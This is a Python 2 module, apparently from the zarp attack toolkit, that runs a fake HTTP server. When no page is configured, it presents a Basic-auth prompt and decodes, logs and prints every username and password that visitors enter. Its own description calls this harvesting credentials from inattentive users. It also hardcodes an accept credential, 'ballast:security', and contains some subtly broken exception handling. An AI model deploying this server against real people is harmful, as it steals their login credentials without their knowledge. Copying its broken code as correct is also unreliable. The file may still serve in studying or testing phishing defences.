import util
import BaseHTTPServer
import base64
import socket
from time import sleep
from service import Service
from threading import Thread
from zoption import Zoption


class http(Service):
    """
    """

    def __init__(self):
        super(http, self).__init__('HTTP Server')
        self.httpd = None
        self.config['port'].value = 80
        self.config.update({"root": Zoption(type = "str", 
                                     value = None,
                                     required = False, 
                                     display = "Root file to serve"),
                            "server": Zoption(type = "str",
                                       value = "Unified HTTP Server v3.1",
                                       required = False,
                                       display = "Server name"
                                    )
                            })
        self.info = """
                    Emulate an HTTP server.  If no default page is entered, 
                    an auth realm will be presented instead.  This can be 
                    used to harvest usernames/passwords from users not 
                    paying attention.
                    """

    def initialize_bg(self):
        """Initialize the server in the background
        """
        util.Msg('Running HTTP server')
        http_thread = Thread(target=self.initialize)
        http_thread.start()

        sleep(1)    # make sure it starts up
        return self.running

    def initialize(self):
        """Initialize the server"""
        try:
            self.httpd = ZarpHTTPServer(('', self.config['port'].value), 
                                                          self.handler)
            self.running = True
            self.httpd.serve()
        except socket.error, KeyboardInterrupt:
            self.running = False
        except PortBoundException:
            util.Error("Port %d is already bound." % self.config['port'].value)
            self.running = False
        except Exception, e:
            util.Error('Error: %s' % e)
            self.running = False
        self.shutdown()

    def handler(self, *args):
        """Magic for passing context into the request handler"""
        context = {
                'root': self.config['root'].value,
                'dump': self.dump_data,
                'log_data': self.log_data,
                'log_file': self.log_file,
                'server' : self.config['server'].value
                  }
        RequestHandler(context, *args)

    def shutdown(self):
        """Shutdown the HTTP server"""
        if self.running:
            self.httpd.stop()

    def cli(self, parser):
        """ initialize CLI options
        """
        parser.add_argument('--http', help='HTTP Server', action='store_true',
                                default=False, dest=self.which)


class ZarpHTTPServer(BaseHTTPServer.HTTPServer):
    """ Custom implementation because you can't cleanly shutdown
        a BaseHTTPServer with a timeout.
    """

    def server_bind(self):
        """Overload the binded server so we can set a timeout
           on the local socket
        """
        try:
            BaseHTTPServer.HTTPServer.server_bind(self)
            self.socket.settimeout(3)
        except:
            raise PortBoundException
        self.run = True

    def stop(self):
        """Stop the HTTP server"""
        try:
            self.run = False
            self.socket.close()
        except Exception, e:
            util.Error('Error closing HTTP socket: %s' % e)

    def serve(self):
        """Serve up the server, bail when we're done running"""
        try:
            while True:
                self.handle_request()
                if not self.run:
                    raise socket.error
        except:
            raise socket.error


class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    """ Request handler for HEAD/GET.  POST will be added if necessary,
        maybe harvesting POST data?
    """

    def __init__(self, context, *args):
        self.context = context
        try:
            BaseHTTPServer.BaseHTTPRequestHandler.__init__(self, *args)
            self.server.socket.setsockopt(socket.SOL_SOCKET,
                                        socket.SO_REUSEADDR, 1)
        except Exception:
            pass

    def send_headers(self):
        """Send the HTTP headers"""
        self.server_version = self.context['server']
        self.sys_version = 'v3.1'
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def send_auth_headers(self):
        """Send the auth header"""
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm=\"Security Realm\"')
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_HEAD(self):
        """Send headers on HEAD"""
        self.send_headers()

    def do_GET(self):
        """Handle GET"""
        try:
            # go away
            if self.path == '/favicon.ico':
                return
            # serve user-specified page
            if not self.context['root'] is None and util.does_file_exist(self.context['root']):
                self.send_headers()
                fle = open(self.context['root'], 'rb')
                self.wfile.write(fle.read())
                fle.close()
                return

            # else serve up the authentication page to collect credentials
            auth_header = self.headers.getheader('Authorization')
            if auth_header is None:
                self.send_auth_headers()
            elif auth_header.split(' ')[1] == base64.b64encode('ballast:security'):
                self.send_headers()
                self.wfile.write('Authenticated :)')
            elif not auth_header is None:
                if self.context['log_data']:
                    self.context['log_file'].write(base64.b64decode(auth_header.split(' ')[1]) + '\n')
                    self.context['log_file'].flush()
                if self.context['dump']:
                    util.Msg('Collected: \033[32m%s\033[33m'%base64.b64decode(auth_header.split(' ')[1]))
                self.send_auth_headers()
            else:
                self.send_auth_headers()
        except Exception, j:
            if j.errono == 32:
                # connection closed prematurely
                return
            util.Error('Error: %s' % j)
            return
        except KeyboardInterrupt:
            return

    def log_message(self, format, *args):
        """override logger"""
        if self.context['dump'] or self.context['log_data']:
            tmp = ''
            for i in args:
                tmp += ' '
                tmp += i
            if self.context['dump']:
                print self.address_string() + tmp
            if self.context['log_data']:
                self.context['log_file'].write(self.address_string() + tmp + '\n')
                self.context['log_file'].flush()


class PortBoundException(Exception):
    pass
